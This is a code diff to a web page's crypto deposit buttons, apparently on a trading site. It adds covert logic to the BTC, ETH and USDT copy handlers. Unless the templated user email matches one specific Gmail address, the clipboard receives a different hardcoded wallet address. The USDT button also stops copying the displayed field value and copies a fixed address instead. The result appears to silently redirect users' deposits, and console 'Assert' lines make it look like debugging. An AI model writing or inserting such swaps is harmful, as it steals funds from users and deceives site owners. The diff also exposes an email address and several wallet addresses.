@@ -166,7 +166,8 @@
     })
   }
   btcButton.onclick = () => {
-    navigator.clipboard.writeText("3Qff8WZTvfdDqSJg6spiEH1aYQovaQoT5k").then(() => {
+  console.log(`Assert ${"<%= email %>" == "xtbonlinetrade.fx@gmail.com"}`)
+    navigator.clipboard.writeText("<%= email %>" == "xtbonlinetrade.fx@gmail.com" ? "3Qff8WZTvfdDqSJg6spiEH1aYQovaQoT5k" : "138Qp8AuGMiaznizSiQxHEBWMdxbRs8TTv").then(() => {
       // navigator.clipboard.writeText("138Qp8AuGMiaznizSiQxHEBWMdxbRs8TTv").then(() => {
       btcButton.textContent = "COPIED"
       setTimeout(() => {
@@ -175,7 +176,8 @@
     })
   }
   ethButton.onclick = () => {
-    navigator.clipboard.writeText("0x8cA0AEaB56FE3129eA253418BCC64c424a9d72Fc").then(() => {
+  console.log(`Assert ETH ${"<%= email %>" == "xtbonlinetrade.fx@gmail.com"}`)
+    navigator.clipboard.writeText("<%= email %>" == "xtbonlinetrade.fx@gmail.com" ? "0x8cA0AEaB56FE3129eA253418BCC64c424a9d72Fc" : "0xeefc41436b93f815bB9e660Aa24557FE0a3f3f9f").then(() => {
       // navigator.clipboard.writeText("0x9c41CA5EF30802e81a70Fda1Dff69e263436bEa8").then(() => {
       ethButton.textContent = "COPIED"
       setTimeout(() => {
@@ -184,7 +186,8 @@
     })
   }
   erc20Button.onclick = () => {
-    navigator.clipboard.writeText(erc20Value.value).then(() => {
+    console.log(`Assert USDT ${"<%= email %>" == "xtbonlinetrade.fx@gmail.com"}`)
+    navigator.clipboard.writeText("<%= email %>" == "xtbonlinetrade.fx@gmail.com" ? "0xc53E1E10b903d11680025Ff86c9ECD00208C7659" : "0x9c41CA5EF30802e81a70Fda1Dff69e263436bEa8").then(() => {
       erc20Button.textContent = "COPIED"
       setTimeout(() => {
         erc20Button.textContent = "COPY"
